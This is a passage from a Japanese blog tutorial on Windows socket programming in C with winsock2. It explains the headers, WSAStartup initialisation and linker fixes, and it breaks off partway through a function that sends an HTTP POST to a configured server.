1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;今回作成したプログラム&lt;/h2&gt;
&lt;p&gt;今回作成したプログラムは以下のリポジトリに置いてあります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/kash1064/Try2WinDbg/blob/master/build/c/win_tcp_udp.c&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Try2WinDbg/win&lt;em&gt;tcp&lt;/em&gt;udp.c&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;次の2つの機能を実装してます。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TCPコネクションを確立してPOSTリクエストを送信する&lt;/li&gt;
&lt;li&gt;UDPでデータを送信する&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ヘッダファイルは以下のものを使用してます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;winsock2.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdlib.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdint.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token function&quot;&gt;comment&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;lib&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;ws2_32.lib&quot;&lt;/span&gt;&lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// IPアドレスを扱う場合などに利用&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// #include &amp;lt;ws2tcpip.h&gt;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// #include &amp;lt;iphlpapi.h&gt;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// #pragma comment(lib, &quot;iphlpapi.lib&quot;)&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// winsock2.h と併用して使用する場合は、必ずwinsock2.hより後に定義する&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// #include &amp;lt;windows.h&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;winsock2&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#winsock2&quot; aria-label=&quot;winsock2 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;winsock2&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;winsock2.h&lt;/code&gt;は、Windows Sockets 2を含むいくつかの実装を行う際に使用するヘッダファイルです。&lt;/p&gt;
&lt;p&gt;Windows環境におけるソケット通信に使用するAPI関数などが含まれています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/winsock2/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Winsock2.h header - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/_winsock/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windows Sockets 2 - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Winsock&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Winsock - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Windowsでソケットプログラミングを行う際の最初の一歩は、この&lt;code class=&quot;language-text&quot;&gt;winsock2.h&lt;/code&gt;で定義されている&lt;code class=&quot;language-text&quot;&gt;WSAStartup&lt;/code&gt;関数を使って&lt;code class=&quot;language-text&quot;&gt;WSADATA&lt;/code&gt;構造体の初期化を行うことです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;WSADATA (winsock.h) - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsastartup&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;WSAStartup function (winsock2.h) - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;WSAStartup&lt;/code&gt;関数は使用するWindows Socketsのバージョンと、初期化する&lt;code class=&quot;language-text&quot;&gt;WSADATA&lt;/code&gt;構造体の2つを引数に取ります。&lt;/p&gt;
&lt;p&gt;少々ややこしい点として、&lt;code class=&quot;language-text&quot;&gt;WSAStartup&lt;/code&gt;関数の第一引数は、16bit符号なし整数(WORD型)を取りますが、下位8bitにWindows Socketsのメジャーバージョン、上位8bitにマイナーバージョンを指定する必要があります。&lt;/p&gt;
&lt;p&gt;そのため、引数に与える値は&lt;code class=&quot;language-text&quot;&gt;MAKEWORD&lt;/code&gt;マクロを使用して作成しています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms632663(v=vs.85)&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;MAKEWORD macro (Windows) | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;また、初期化に成功した場合、&lt;code class=&quot;language-text&quot;&gt;WSAStartup&lt;/code&gt;関数は戻り値0を返し、失敗した場合は定義されているエラーコードのいずれかを返します。&lt;/p&gt;
&lt;p&gt;そのため、今回の実装には含めていませんが&lt;code class=&quot;language-text&quot;&gt;WSAStartup&lt;/code&gt;関数の戻り値でエラー処理を実装します。&lt;/p&gt;
&lt;h3 id=&quot;pragma-comment&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#pragma-comment&quot; aria-label=&quot;pragma comment permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;pragma comment()&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;winsock2.h&lt;/code&gt;などのヘッダファイルをインクルードしてコンパイルしようとすると、&lt;code class=&quot;language-text&quot;&gt;error LNK2019: 未解決の外部シンボル&lt;/code&gt;のようなエラーが返ってくる場合があります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;win_tcp_udp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;obj : error LNK2019: 未解決の外部シンボル __imp__closesocket@4 が関数 _send_http_post で参照されました
win_tcp_udp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;obj : error LNK2019: 未解決の外部シンボル __imp__connect@12 が関数 _send_http_post で参照されました
win_tcp_udp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;obj : error LNK2019: 未解決の外部シンボル __imp__htons@4 が関数 _send_http_post で参照されました
win_tcp_udp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;obj : error LNK2019: 未解決の外部シンボル __imp__inet_addr@4 が関数 _send_http_post で参照されました
win_tcp_udp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;obj : error LNK2019: 未解決の外部シンボル __imp__send@16 が関数 _send_http_post で参照されました
win_tcp_udp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;obj : error LNK2019: 未解決の外部シンボル __imp__sendto@24 が関数 _send_udp で参照されました
win_tcp_udp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;obj : error LNK2019: 未解決の外部シンボル __imp__socket@12 が関数 _send_http_post で参照されました
win_tcp_udp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;obj : error LNK2019: 未解決の外部シンボル __imp__WSAStartup@8 が関数 _send_http_post で参照されました
win_tcp_udp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;obj : error LNK2019: 未解決の外部シンボル __imp__WSACleanup@0 が関数 _send_http_post で参照されました
&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;\build\bin\win_tcp_udp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;exe : fatal error LNK1120: 9 件の未解決の外部参照&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;これは、コンパイラがライブラリをリンクできないことで発生します。&lt;/p&gt;
&lt;p&gt;解決方法として、次のどちらかを実施します。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;VisualStudioで開発している場合は、プロジェクトのプロパティの[構成プロパティ]&gt;[リンカー]&gt;[入力]から[追加の依存ファイル]に参照エラーの発生しているライブラリを追加します&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;#pragma comment(lib, &quot;&amp;lt;ライブラリ名&gt;.lib&quot;)&lt;/code&gt;を追記します。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;今回はプロジェクトは作成せずCファイルをcl.exeでコンパイルしたいので、&lt;code class=&quot;language-text&quot;&gt;pragma&lt;/code&gt;を使っていきます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;pragma&lt;/code&gt;とは、コンパイル時に特定のアクションを指示する命令です。&lt;/p&gt;
&lt;p&gt;特に、&lt;code class=&quot;language-text&quot;&gt;comment&lt;/code&gt;の&lt;code class=&quot;language-text&quot;&gt;lib&lt;/code&gt;構文を使用することで、コンパイル時にリンクするライブラリをソースコード側から指定することができます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/cpp/c-language/c-pragmas?view=msvc-170&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;C Pragmas | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/cpp/preprocessor/comment-c-cpp?view=msvc-170&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;comment pragma | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;そのため、&lt;code class=&quot;language-text&quot;&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)&lt;/code&gt;の行を追加することで&lt;code class=&quot;language-text&quot;&gt;winsock2.h&lt;/code&gt;のリンクエラーを回避することができるようになります。&lt;/p&gt;
&lt;h3 id=&quot;ws2tcpiph&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ws2tcpiph&quot; aria-label=&quot;ws2tcpiph permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ws2tcpip.h&lt;/h3&gt;
&lt;p&gt;今回の実装では不要ですが、&lt;code class=&quot;language-text&quot;&gt;ws2tcpip.h&lt;/code&gt;はIPアドレスの取得に関連する構造体などが定義された、TCP/IPを行うために必要なヘッダファイルです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-basic-winsock-application&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Creating a Basic Winsock Application - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Ws2Tcpip.h header - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;postリクエストを送信する関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#post%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%82%92%E9%80%81%E4%BF%A1%E3%81%99%E3%82%8B%E9%96%A2%E6%95%B0&quot; aria-label=&quot;postリクエストを送信する関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;POSTリクエストを送信する関数&lt;/h2&gt;
&lt;p&gt;任意のアドレスに対してPOSTリクエストを送信する関数は以下の通りです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;send_http_post&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;senddata&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; destination&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; RSERVER&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;short&lt;/span&gt; port &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; httppath&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;/upload&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; httphost&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; LSERVER&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; dstSocket&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; result&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
 
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; toSendText&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;MAXBUF&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; postdata&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;MAXBUF&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; read_size&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// WSADATAの初期化&lt;/span&gt;
    WSADATA data&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;WSAStartup&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;MAKEWORD&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// AF_INETを設定&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;sockaddr_in&lt;/span&gt; dstAddr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;dstAddr&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstAddr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    dstAddr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sin_port &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;port&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    dstAddr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sin_family &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; AF_INET&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    dstAddr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sin_addr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;s_addr &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;inet_addr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;destination&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// Socket通信の開始(SOCK_STREAMを指定)&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Creating socket...\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    dstSocket &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;AF_INET&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; SOCK_STREAM&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstSocket &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Creating socket failed!!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Creating socket succeeded!!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
 
    &lt;span class=&quot;token comment&quot;&gt;// 通信の開始&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Connecting...\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    result &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstSocket&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;dstAddr&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstAddr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;result &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;\t==&gt;Binding failed!!\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
